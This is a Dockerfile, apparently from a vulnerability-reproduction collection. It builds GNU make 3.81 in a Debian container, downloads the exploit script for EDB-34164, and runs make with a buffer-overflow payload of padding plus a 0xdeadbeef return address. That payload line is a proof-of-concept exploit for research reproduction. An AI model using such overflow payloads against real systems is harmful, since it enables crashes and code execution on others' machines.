FROM debian:latest

MAINTAINER "Dongliang Mu" <mudongliangabcd@gmail.com>

RUN apt-get -y update && apt-get -y upgrade; \
    apt-get install -y build-essential wget; \
    cd /root/; \
    wget https://raw.githubusercontent.com/mudongliang/source-packages/master/EDB-34164/make-3.81.tar.gz; \
    wget https://raw.githubusercontent.com/mudongliang/LinuxFlaw/master/EDB-34164/34164.pl; \
    tar -xvf make-3.81.tar.gz; cd make-3.81/; ./configure; make; \
    rm -rf /var/lib/apt/lists/*;

CMD /root/make-3.81/make `perl -e 'print "A" x 4000 . "B"x96 . "\xef\xbe\xad\xde"x4'`
